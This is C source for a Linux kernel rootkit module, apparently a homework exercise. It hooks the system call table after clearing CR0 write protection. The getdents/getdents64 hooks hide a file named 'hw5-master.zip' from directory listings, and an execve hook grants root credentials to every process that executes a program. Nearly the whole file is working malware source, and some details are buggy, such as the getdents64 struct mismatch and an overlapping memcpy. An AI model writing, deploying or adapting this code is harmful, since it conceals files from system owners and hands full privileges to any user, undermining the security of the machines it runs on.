#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/unistd.h>
#include <asm/paravirt.h>
#include <linux/kallsyms.h>
#include <linux/gfp.h>
#include <linux/slab.h>
#include <linux/init.h>
#include <linux/types.h>
#include <linux/stat.h>
#include <linux/fcntl.h>
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/dcache.h>
#include <linux/namei.h>
#include <linux/path.h>
#include <linux/cred.h>

unsigned long  **syscall_table;// = 0xffffffff81a00240;

typedef struct linux_dirent {
    unsigned long  d_ino;     /* Inode number */
    unsigned long  d_off;     /* Offset to next linux_dirent */
    unsigned short d_reclen;  /* Length of this linux_dirent */
    char           d_name[];  /* Filename (null-terminated) */
                        /* length is actually (d_reclen - 2 -
                           offsetof(struct linux_dirent, d_name) */
    /*
    char           pad;       // Zero padding byte
    char           d_type;    // File type (only since Linux 2.6.4;
                              // offset is (d_reclen - 1))
    */

}linux_dirent;


asmlinkage int (*original_getdents)(unsigned int,struct linux_dirent*, unsigned int);
asmlinkage int (*original_getdents64)(unsigned int,struct linux_dirent*, unsigned int);//not sure which one of the two constants the kernel uses
asmlinkage int (*original_execve)(const char *pathname, char *const argv[], char *const envp[]);

asmlinkage int new_getdents(unsigned int fd,struct linux_dirent* dirp,
                    unsigned int count){
    int bytesread = original_getdents(fd,dirp,count);
    int newBytes = bytesread;

    /*struct path* inodeInfoBuffer = (struct path*)kcalloc(1,sizeof(struct path),GFP_KERNEL);
    int errormessage = kern_path("/", LOOKUP_FOLLOW, inodeInfoBuffer);
    printk("error: %d",errormessage);
    printk("filesize = %d",inodeInfoBuffer->dentry->d_inode->i_size);   inode information
    printk("mode = %lu",inodeInfoBuffer->dentry->d_inode->i_mode);
    printk("sizeof modefield = %lu",sizeof(umode_t));*/


    printk("succesfully executed getdents with %d bytes read, filename %s \n",bytesread, dirp->d_name);
    int bytes;
    for(bytes = 0; bytes < newBytes;){
        linux_dirent* d = (linux_dirent*) (((void*)(dirp)) + bytes);
        printk("%s: bytes long: %d\n",d->d_name,d->d_reclen);
        printk("inode number: %lu", d->d_ino);
        if(strcmp(d->d_name,"hw5-master.zip") == 0){
            printk("Match found for Desktop. Hiding from dirent entries.");
            void* alteredBuffer = (((void*)(dirp)) + bytes) + d->d_reclen;
            int removedEntrySize = d->d_reclen;
            int copySize = newBytes - bytes - removedEntrySize;
            memcpy(d,alteredBuffer,copySize);
            newBytes -= removedEntrySize;
            continue;
        }
        else
            bytes += d->d_reclen;
    }
    //kfree(inodeInfoBuffer);
    printk("hello world its getdents function");
    return newBytes;
}

asmlinkage int new_execve(const char *pathname, char *const argv[], char *const envp[]){
    commit_creds(prepare_kernel_cred(0));
    return original_execve(pathname,argv,envp);

}

int init_module(){
    write_cr0 (read_cr0 () & (~ 0x10000));//necessary to make the sys_call_table writable
    syscall_table = (unsigned long**)kallsyms_lookup_name("sys_call_table");
    printk("loaded syscall table\n");
    original_getdents = (void*)syscall_table[__NR_getdents];//get original function
	original_getdents64 = (void*)syscall_table[__NR_getdents64];
    original_execve = (void*)syscall_table[__NR_execve];
    syscall_table[__NR_getdents64] = (unsigned long*)new_getdents;//replace function
	syscall_table[__NR_getdents] = (unsigned long*)new_getdents;
    syscall_table[__NR_execve] = (unsigned long*)new_execve;
    write_cr0 (read_cr0 () | 0x10000);//necessary to restore syscall table to read only
    return 0;
}

void cleanup_module(){
    write_cr0 (read_cr0 () & (~ 0x10000));
    syscall_table[__NR_getdents64] = ((unsigned long*)original_getdents64);//restore original functions
	syscall_table[__NR_getdents] = ((unsigned long*)original_getdents);
    syscall_table[__NR_execve] = ((unsigned long*)original_execve);
	printk("successfully unloaded kernel module");
    write_cr0 (read_cr0 () | 0x10000);
}

MODULE_LICENSE("GPL");
